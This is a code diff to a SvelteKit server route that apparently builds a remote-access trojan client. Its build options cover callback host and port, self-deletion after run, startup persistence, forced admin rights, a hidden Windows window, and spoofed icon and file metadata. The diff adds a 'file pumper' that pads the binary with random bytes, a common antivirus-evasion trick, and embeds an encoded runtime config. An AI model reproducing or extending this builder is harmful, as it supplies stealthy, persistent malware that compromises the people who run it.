@@ -1,6 +1,6 @@
 import { json, error } from '@sveltejs/kit';
 import type { RequestHandler } from './$types';
-import { mkdtemp, rm, mkdir, copyFile, chmod, cp, writeFile } from 'node:fs/promises';
+import { mkdtemp, rm, mkdir, copyFile, chmod, cp, writeFile, stat, open } from 'node:fs/promises';
 import { dirname, join, resolve } from 'node:path';
 import { tmpdir } from 'node:os';
 import { spawn } from 'node:child_process';
@@ -8,12 +8,13 @@ import type { SpawnOptionsWithoutStdio } from 'node:child_process';
 import { randomBytes } from 'node:crypto';
 import { type BuildRequest, type BuildResponse } from '../../../../../shared/types/build';
 import {
-	hasFileInformationPayload,
-	mutexSanitizer,
-	normalizeBuildRequestPayload,
-	parseVersionParts,
-	sanitizeFileInformationPayload,
-	type NormalizedFileInformation
+        encodeRuntimeConfig,
+        hasFileInformationPayload,
+        mutexSanitizer,
+        normalizeBuildRequestPayload,
+        parseVersionParts,
+        sanitizeFileInformationPayload,
+        type NormalizedFileInformation
 } from './normalizer';
 
 const maxIconBytes = 512 * 1024;
@@ -139,9 +140,9 @@ async function runCommand(
 }
 
 async function compressBinaryWithUpx(
-	binaryPath: string,
-	output: string[],
-	warnings: string[]
+        binaryPath: string,
+        output: string[],
+        warnings: string[]
 ): Promise<void> {
 	try {
 		const exitCode = await runCommand(
@@ -166,6 +167,40 @@ async function compressBinaryWithUpx(
 		const message = err instanceof Error ? err.message : 'Unknown compression error.';
 		warnings.push(`Compression failed: ${message}`);
 	}
+}
+
+async function padBinaryToSize(
+        binaryPath: string,
+        targetBytes: number,
+        warnings: string[]
+): Promise<void> {
+        if (!Number.isFinite(targetBytes) || targetBytes <= 0) {
+                return;
+        }
+
+        try {
+                const stats = await stat(binaryPath);
+                if (stats.size >= targetBytes) {
+                        return;
+                }
+
+                let remaining = targetBytes - stats.size;
+                const handle = await open(binaryPath, 'a');
+                try {
+                        const chunkSize = 1024 * 1024;
+                        while (remaining > 0) {
+                                const writeSize = Math.min(remaining, chunkSize);
+                                const filler = randomBytes(writeSize);
+                                await handle.write(filler);
+                                remaining -= writeSize;
+                        }
+                } finally {
+                        await handle.close();
+                }
+        } catch (err) {
+                const message = err instanceof Error ? err.message : 'Unknown padding error.';
+                warnings.push(`File padding failed: ${message}`);
+        }
 }
 
 function generateSharedSecret(): string {
@@ -196,26 +231,27 @@ export const POST: RequestHandler = async ({ request }) => {
 	}
 
 	const normalized = normalizeBuildRequestPayload(body);
-	const {
-		host,
-		port,
-		targetOS,
-		targetArch,
-		outputFilename,
-		installationPath,
-		meltAfterRun,
-		startupOnBoot,
-		developerMode,
-		mutexName,
-		compressBinary,
-		forceAdmin,
-		pollIntervalMs,
-		maxBackoffMs,
-		shellTimeoutSeconds,
-		fileIcon,
-		fileInformation,
-		audio
-	} = normalized;
+        const {
+                host,
+                port,
+                targetOS,
+                targetArch,
+                outputFilename,
+                installationPath,
+                meltAfterRun,
+                startupOnBoot,
+                developerMode,
+                mutexName,
+                compressBinary,
+                forceAdmin,
+                pollIntervalMs,
+                maxBackoffMs,
+                shellTimeoutSeconds,
+                fileIcon,
+                fileInformation,
+                audio,
+                filePumper
+        } = normalized;
 	const sharedSecret = generateSharedSecret();
 	const iconPayload = normalizeFileIcon(fileIcon ?? null);
 	const fileInformationPayload = sanitizeFileInformationPayload(fileInformation ?? null);
@@ -267,9 +303,14 @@ export const POST: RequestHandler = async ({ request }) => {
 		if (shellTimeoutSeconds) {
 			ldflagsParts.push(`-X main.defaultShellTimeoutOverrideSecs=${shellTimeoutSeconds}`);
 		}
-		if (compressBinary) {
-			ldflagsParts.push('-s -w');
-		}
+                if (compressBinary) {
+                        ldflagsParts.push('-s -w');
+                }
+
+                const encodedRuntimeConfig = encodeRuntimeConfig(normalized);
+                if (encodedRuntimeConfig) {
+                        ldflagsParts.push(`-X main.defaultRuntimeConfigEncoded=${encodedRuntimeConfig}`);
+                }
 
 		if (!developerMode && targetOS === 'windows') {
 			ldflagsParts.push('-H=windowsgui');
@@ -386,9 +427,13 @@ export const POST: RequestHandler = async ({ request }) => {
 			return json(response, { status: 200 });
 		}
 
-		if (compressBinary) {
-			await compressBinaryWithUpx(tempBinaryPath, buildOutput, warnings);
-		}
+                if (compressBinary) {
+                        await compressBinaryWithUpx(tempBinaryPath, buildOutput, warnings);
+                }
+
+                if (filePumper) {
+                        await padBinaryToSize(tempBinaryPath, filePumper.targetBytes, warnings);
+                }
 
 		const logLines = buildOutput
 			.join('')
